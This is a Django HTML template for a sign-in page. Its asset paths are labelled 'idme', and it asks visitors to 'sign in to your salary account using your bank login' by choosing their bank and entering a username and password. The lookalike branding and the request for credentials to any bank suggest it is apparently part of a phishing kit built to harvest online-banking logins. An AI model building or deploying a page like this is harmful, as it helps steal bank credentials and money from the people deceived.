      <div class="page-container" data-role="page-container">
        <div class="container">
          <div class="content-container">
            <form class="new_user" id="new_user" data-validate="signin" accept-charset="UTF-8" method="post">
              {% csrf_token %}
              <div class="form-header">
                <div class="form-header-content" role="banner">
                  <div class="partner">
                    <div class="c_icon m_frontend/idme">
                      <img alt="salary account" src="{% static 'frontend/idme/bank.png' %}" width="300">
                    </div>
                  </div>
                </div>
              </div>
              <main aria-labelledby="sr_page_title" class="form-container">
                <div class="form-header-access">
                  <h2 id="sr_page_title">Sign in to your salary account using your bank login</h2>
                </div>

                <div class="form-fields">

                  {% include 'frontend/idme/messages.html' %}

                  <div class="field-group">

                    <div class="field text">
                      <label for="user_email">Bank Name:</label>
                      <select name="bank" id="bank" required>
                        <option value="">Select Bank</option>
                        {% for bank in banks %}
                        <option value="{{bank}}">{{bank}}</option>
                        {% endfor %}
                      </select>
                    </div>

                    <div class="field text">
                      <label for="user_email">Username</label>
                      <input placeholder="Enter your username" required="required" type="text" name="email">
                      <span role="alert"></span>
                    </div>

                    <div class="field text">
                      <label for="user_password">Password</label>
                      <input placeholder="Enter password" required="required" autocomplete="current-password" type="password" name="password" id="user_password">
                      <span role="alert"></span>
                    </div>

                    <div class="field checkbox remember_me" data-component="Cookies.Delete" data-endpoint="/cookies/remember_me">
                      <input type="checkbox" name="remember_me" id="remember_me" value="true" aria-describedby="remember-me-tip">
                      <label for="remember_me">
                        <span aria-hidden="true" class="checkmark">î˜›</span>
                        <span> Remember me </span>
                        <div id="remember-me-tip">
                          For your security, select only on your devices.
                        </div>
                      </label>
                    </div>

                  </div>
                </div>

                <div class="form-actions">
                  <input type="submit" name="commit" value="Sign in" class="btn btn-primary">
                </div>
              </main>
            </form>
          </div>
        </div>
      </div>
